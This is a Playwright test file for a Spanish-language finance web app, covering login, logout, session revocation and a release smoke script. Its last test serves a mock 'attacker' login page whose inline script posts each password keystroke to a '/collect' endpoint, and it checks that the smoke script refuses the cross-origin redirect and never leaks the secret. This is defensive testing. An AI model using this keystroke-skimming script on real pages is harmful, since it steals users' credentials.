import {expect, test} from "playwright/test";
import {spawn, spawnSync} from "node:child_process";
import {createServer} from "node:http";
import {fileURLToPath} from "node:url";

const testUsername = "e2e-operator";
const testPassword = "E2E-only-test-password-2026!";
const bootstrapCacheKey = "miscuentas.api./api/bootstrap/";

async function listen(server: ReturnType<typeof createServer>) {
  await new Promise<void>((resolve, reject) => {
    server.once("error", reject);
    server.listen(0, "127.0.0.1", resolve);
  });
  const address = server.address();
  if (!address || typeof address === "string") throw new Error("No se pudo abrir el servidor de prueba.");
  return address.port;
}

async function runSmokeProcess(smokeScript: string, cwd: string, origin: string, username: string, password: string) {
  return new Promise<{code: number | null; stdout: string; stderr: string}>((resolve, reject) => {
    const child = spawn(process.execPath, [smokeScript, origin], {
      cwd,
      env: {...process.env, RELEASE_SMOKE_USERNAME: username, RELEASE_SMOKE_PASSWORD: password},
      stdio: ["ignore", "pipe", "pipe"],
    });
    let stdout = "";
    let stderr = "";
    child.stdout.setEncoding("utf8").on("data", (chunk: string) => { stdout += chunk; });
    child.stderr.setEncoding("utf8").on("data", (chunk: string) => { stderr += chunk; });
    child.on("error", reject);
    child.on("close", (code) => resolve({code, stdout, stderr}));
  });
}

async function login(page: import("playwright/test").Page) {
  await page.goto("/");
  await expect(page.getByRole("heading", {name: "Inicia sesión"})).toBeVisible();
  await page.getByLabel("Usuario").fill(testUsername);
  await page.getByLabel("Contraseña").fill(testPassword);
  await page.getByRole("button", {name: "Entrar"}).click();
  await expect(page.getByRole("heading", {name: "Resumen"})).toBeVisible();
}

test("enfocar Usuario y Contraseña en viewport móvil mantiene 16px y la escala", async ({page}) => {
  await page.setViewportSize({width: 390, height: 844});
  await page.goto("/");
  await expect(page.getByRole("heading", {name: "Inicia sesión"})).toBeVisible();
  const initialScale = await page.evaluate(() => window.visualViewport?.scale ?? 1);

  for (const label of ["Usuario", "Contraseña"]) {
    const input = page.getByLabel(label);
    const fontSize = await input.evaluate((element) => Number.parseFloat(getComputedStyle(element).fontSize));
    expect(fontSize).toBeGreaterThanOrEqual(16);
    await input.focus();
    await expect(input).toBeFocused();
    expect(await page.evaluate(() => window.visualViewport?.scale ?? 1)).toBe(initialScale);
  }
});

test("denies anonymous finance access, logs in, and clears local data on logout", async ({page}) => {
  await page.goto("/");
  await expect(page.getByRole("heading", {name: "Inicia sesión"})).toBeVisible();

  const anonymous = await page.request.get("/api/bootstrap/");
  expect(anonymous.status()).toBe(401);
  expect(anonymous.headers()["content-type"]).toContain("application/json");

  await page.getByLabel("Usuario").fill(testUsername);
  await page.getByLabel("Contraseña").fill(testPassword);
  await page.getByRole("button", {name: "Entrar"}).click();
  await expect(page.getByRole("heading", {name: "Resumen"})).toBeVisible();
  await expect.poll(() => page.evaluate((key) => window.localStorage.getItem(key), bootstrapCacheKey)).not.toBeNull();

  await page.getByRole("button", {name: "Cerrar sesión"}).first().click();
  await expect(page.getByRole("heading", {name: "Inicia sesión"})).toBeVisible();
  expect(await page.evaluate((key) => window.localStorage.getItem(key), bootstrapCacheKey)).toBeNull();
});

test("a revoked session hides cached finance data and preserves the current route", async ({page}) => {
  await login(page);
  const originalUrl = page.url();
  await expect.poll(() => page.evaluate((key) => window.localStorage.getItem(key), bootstrapCacheKey)).not.toBeNull();

  await page.context().clearCookies();
  await page.reload();

  await expect(page.getByRole("heading", {name: "Inicia sesión"})).toBeVisible();
  expect(page.url()).toBe(originalUrl);
  expect(await page.evaluate((key) => window.localStorage.getItem(key), bootstrapCacheKey)).toBeNull();
});

test("the mobile More sheet can close the session", async ({page}) => {
  await page.setViewportSize({width: 390, height: 844});
  await login(page);
  await page.locator(".bottom-nav").getByRole("button", {name: "Más", exact: true}).click();

  const sheet = page.getByRole("dialog", {name: "Más secciones"});
  await sheet.getByRole("button", {name: "Cerrar sesión"}).click();

  await expect(page.getByRole("heading", {name: "Inicia sesión"})).toBeVisible();
});

test("the optional release smoke requires credentials and opens protected views", async ({page}, testInfo) => {
  test.skip(testInfo.project.name !== "chromium", "El smoke externo usa Chromium una sola vez.");
  const origin = new URL(testInfo.project.use.baseURL as string).origin;
  const smokeScript = fileURLToPath(new URL("../scripts/smoke-release.mjs", import.meta.url));
  const cwd = fileURLToPath(new URL("..", import.meta.url));
  const missingCredentials = spawnSync(process.execPath, [smokeScript, origin], {
    cwd,
    encoding: "utf8",
    env: {...process.env, RELEASE_SMOKE_USERNAME: "", RELEASE_SMOKE_PASSWORD: ""},
    timeout: 30_000,
  });
  expect(missingCredentials.status).not.toBe(0);
  expect(missingCredentials.stderr).toContain("proporciona RELEASE_SMOKE_USERNAME y RELEASE_SMOKE_PASSWORD");

  const insecureExternalOrigin = spawnSync(process.execPath, [smokeScript, "http://release.example.invalid"], {
    cwd,
    encoding: "utf8",
    env: {...process.env, RELEASE_SMOKE_USERNAME: testUsername, RELEASE_SMOKE_PASSWORD: testPassword},
    timeout: 10_000,
  });
  expect(insecureExternalOrigin.status).not.toBe(0);
  expect(insecureExternalOrigin.stderr).toContain("requiere HTTPS");
  expect(`${insecureExternalOrigin.stdout}\n${insecureExternalOrigin.stderr}`).not.toContain(testPassword);

  const authenticatedSmoke = spawnSync(process.execPath, [smokeScript, origin], {
    cwd,
    encoding: "utf8",
    env: {...process.env, RELEASE_SMOKE_USERNAME: testUsername, RELEASE_SMOKE_PASSWORD: testPassword},
    timeout: 60_000,
  });
  expect(authenticatedSmoke.status, `${authenticatedSmoke.stdout}\n${authenticatedSmoke.stderr}`).toBe(0);
  expect(authenticatedSmoke.stdout).toContain("Smoke de release: 7 vistas");
});

test("the release smoke rejects a cross-origin login redirect and redacts a failed password fill", async ({}, testInfo) => {
  test.skip(testInfo.project.name !== "chromium", "La prueba de confidencialidad del smoke corre una vez en Chromium.");
  const smokeScript = fileURLToPath(new URL("../scripts/smoke-release.mjs", import.meta.url));
  const cwd = fileURLToPath(new URL("..", import.meta.url));
  const secret = "synthetic-release-smoke-secret-should-not-appear";
  let interceptedPosts = 0;
  let attackerGets = 0;
  const attacker = createServer((request, response) => {
    if (request.method === "POST") {
      interceptedPosts += 1;
      request.resume();
      response.writeHead(204).end();
      return;
    }
    if (request.method === "GET" && request.url === "/") attackerGets += 1;
    response.writeHead(200, {"Content-Type": "text/html; charset=utf-8"}).end(`
      <h1>Inicia sesión</h1>
      <label>Usuario<input name="username"></label>
      <label>Contraseña<input name="password" type="password"></label>
      <button type="button">Entrar</button>
      <script>document.querySelector('[name=password]').addEventListener('input', event => fetch('/collect', {method: 'POST', body: event.target.value}));</script>
    `);
  });
  const attackerPort = await listen(attacker);
  const redirector = createServer((_request, response) => {
    response.writeHead(302, {Location: `http://127.0.0.1:${attackerPort}/`}).end();
  });
  const redirectorPort = await listen(redirector);
  try {
    const redirected = await runSmokeProcess(smokeScript, cwd, `http://127.0.0.1:${redirectorPort}`, "e2e-operator", secret);
    expect(redirected.code).not.toBe(0);
    expect(`${redirected.stdout}\n${redirected.stderr}`).toContain("redirigió fuera del origen");
    expect(`${redirected.stdout}\n${redirected.stderr}`).not.toContain(secret);
    expect(attackerGets).toBe(1);
    expect(interceptedPosts).toBe(0);
  } finally {
    await new Promise<void>((resolve) => redirector.close(() => resolve()));
    await new Promise<void>((resolve) => attacker.close(() => resolve()));
  }

  let midFillPosts = 0;
  let midFillGets = 0;
  const redirectDestination = createServer((request, response) => {
    if (request.method === "POST") {
      midFillPosts += 1;
      request.resume();
      response.writeHead(204).end();
      return;
    }
    if (request.method === "GET" && request.url === "/") midFillGets += 1;
    response.writeHead(200, {"Content-Type": "text/html; charset=utf-8"}).end(`
      <h1>Inicia sesión</h1>
      <label>Usuario<input name="username"></label>
      <label>Contraseña<input name="password" type="password"></label>
      <button type="button">Entrar</button>
      <script>document.querySelector('[name=password]').addEventListener('input', event => fetch('/collect', {method: 'POST', body: event.target.value}));</script>
    `);
  });
  const destinationPort = await listen(redirectDestination);
  const redirectDuringFill = createServer((_request, response) => {
    response.writeHead(200, {"Content-Type": "text/html; charset=utf-8"}).end(`
      <h1>Inicia sesión</h1>
      <label>Usuario<input name="username"></label>
      <label>Contraseña<input name="password" type="password" disabled></label>
      <button type="button">Entrar</button>
      <script>document.querySelector('[name=username]').addEventListener('input', () => setTimeout(() => location.href = 'http://127.0.0.1:${destinationPort}/', 150));</script>
    `);
  });
  const redirectDuringFillPort = await listen(redirectDuringFill);
  try {
    const failedFill = await runSmokeProcess(smokeScript, cwd, `http://127.0.0.1:${redirectDuringFillPort}`, "e2e-operator", secret);
    expect(failedFill.code).not.toBe(0);
    expect(`${failedFill.stdout}\n${failedFill.stderr}`).toContain("Smoke de release fallido");
    expect(`${failedFill.stdout}\n${failedFill.stderr}`).not.toContain(secret);
    expect(midFillGets).toBe(1);
    expect(midFillPosts).toBe(0);
  } finally {
    await new Promise<void>((resolve) => redirectDuringFill.close(() => resolve()));
    await new Promise<void>((resolve) => redirectDestination.close(() => resolve()));
  }
});
